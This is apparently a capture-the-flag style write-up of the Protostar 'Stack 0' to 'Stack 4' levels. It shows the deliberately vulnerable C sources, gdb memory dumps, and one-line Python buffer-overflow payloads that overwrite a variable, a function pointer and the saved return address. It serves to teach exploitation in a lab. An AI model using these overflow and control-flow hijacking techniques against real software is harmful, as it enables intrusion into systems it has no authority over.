---
title: Exploit Education：Protostar
---

> The levels to be exploited can be found in the /opt/protostar/bin directory.

## Stack 0

> memory can be accessed outside of its allocated region

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified; // volatile tells the compiler not to cache the value of `modified`
  char buffer[64];

  modified = 0;
  gets(buffer); // Never use gets().
  // Because it's impossible to tell without knowing the data in advance
  // how many characters gets() will read, and gets() will continue to
  // store characters past the end of the buffer

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

??? note "Dump of assembler code for function main"

    ```bash
    (gdb) set disassembly-flavor intel
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080483f4 <main+0>:	push   ebp
    0x080483f5 <main+1>:	mov    ebp,esp
    0x080483f7 <main+3>:	and    esp,0xfffffff0
    0x080483fa <main+6>:	sub    esp,0x60
    0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0 # modified = 0
    0x08048405 <main+17>:	lea    eax,[esp+0x1c]
    0x08048409 <main+21>:	mov    DWORD PTR [esp],eax  # passing the address of buffer to gets()
    0x0804840c <main+24>:	call   0x804830c <gets@plt>
    0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c] # starting to check the value of modified
    0x08048415 <main+33>:	test   eax,eax
    0x08048417 <main+35>:	je     0x8048427 <main+51>
    0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
    0x08048420 <main+44>:	call   0x804832c <puts@plt>
    0x08048425 <main+49>:	jmp    0x8048433 <main+63>
    0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
    0x0804842e <main+58>:	call   0x804832c <puts@plt>
    0x08048433 <main+63>:	leave  
    0x08048434 <main+64>:	ret    
    End of assembler dump.
    ```

```bash
(gdb) break *0x0804840c
Breakpoint 2 at 0x804840c: file stack0/stack0.c, line 11.
(gdb) break *0x08048411
Breakpoint 3 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) define hook-stop  # define a hook, some commands will be executed when stops
# Note: some unimportant output parts are omitted below
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $eip
>end
(gdb) r
Starting program: /opt/protostar/bin/stack0
(gdb) c
Continuing.
THISISTHEINPUT  # 544849534953544845494e505554
eax            0xbffff65c	-1073744292
ecx            0xbffff65c	-1073744292
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff640	0xbffff640
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff640:	0xbffff65c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x53494854  # start from here
0xbffff660:	0x48545349	0x504e4945	0xbf005455	0x080482e8
0xbffff670:	0xb7ff1040	0x08049620	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff6a8
0xbffff690:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000  # need at least 16 bytes + 1 bit to overwrite the value of `modified`
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:	test   eax,eax

Breakpoint 3, main (argc=1, argv=0xbffff754) at stack0/stack0.c:13
13	in stack0/stack0.c
(gdb) x/wx $esp+0x5c    # check the value of `modified`
0xbffff69c:	0x00000000
```

```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack0
(gdb) c
Continuing.
123456789012345678901234567890123456789012345678901234567890ABCDE
eax            0xbffff65c	-1073744292
ecx            0xbffff65c	-1073744292
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff640	0xbffff640
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff640:	0xbffff65c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x34333231
0xbffff660:	0x38373635	0x32313039	0x36353433	0x30393837
0xbffff670:	0x34333231	0x38373635	0x32313039	0x36353433
0xbffff680:	0x30393837	0x34333231	0x38373635	0x32313039
0xbffff690:	0x36353433	0x30393837	0x44434241	0x00000045
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:	test   eax,eax

Breakpoint 3, main (argc=1, argv=0xbffff754) at stack0/stack0.c:13
13	in stack0/stack0.c
(gdb) x/wx $esp+0x5c
0xbffff69c:	0x00000045
(gdb) c
Continuing.
you have changed the 'modified' variable
```

### Exploit

```bash
$ python -c 'print("A" * 65)' | ./stack0
you have changed the 'modified' variable
```

## Stack 1

> Protostar is little endian

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {  // 'dcba' in little endian
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

### Exploit

```bash
$ ./stack1 $(python -c 'print("A" * 64 + "dcba")')
you have correctly got the variable to the right value
```

## Stack 2

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {  // '\n\r\n\r' in little endian
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### Exploit

```bash
$ GREENIE=$(python -c "print('a' * 64 + '\n\r' * 2)") ./stack2
you have correctly modified the variable
```

## Stack 3

> overwriting function pointers stored on the stack

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;
  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

```bash
(gdb) x win
0x8048424 <win>:	0x83e58955
(gdb) p win # print the value of expression
$1 = {void (void)} 0x8048424 <win>
```

### Exploit

```bash
$ python -c "print('a' * 64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack 4

> overwriting saved EIP

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

- 首先测试一下覆盖点的位置
  
    ```py
    from __future__ import print_function
    for i in range(ord('A'), ord('Z')):
        print(chr(i) * 4, end='')
    ```

    ```bash
    $ python /tmp/stack.py > /tmp/test
    $ gdb ./stack4
    (gdb) r < /tmp/test
    Starting program: /opt/protostar/bin/stack4 < /tmp/test

    Program received signal SIGSEGV, Segmentation fault.
    0x54545454 in ?? () # T
    ```

- 获取函数 `win` 的地址

    ```bash
    $ objdump -t stack4 | grep win
    080483f4 g     F .text	00000014              win
    ```

### Exploit

```bash
$ python -c "print('a' * 19 * 4 + '\xf4\x83\x04\x08')" | ./stack4
code flow successfully changed
Segmentation fault
```

- 可以使用 `struct` 简化

    ```py
    >>> import struct
    >>> struct.pack('I', 0x080483f4)
    '\xf4\x83\x04\x08'
    ```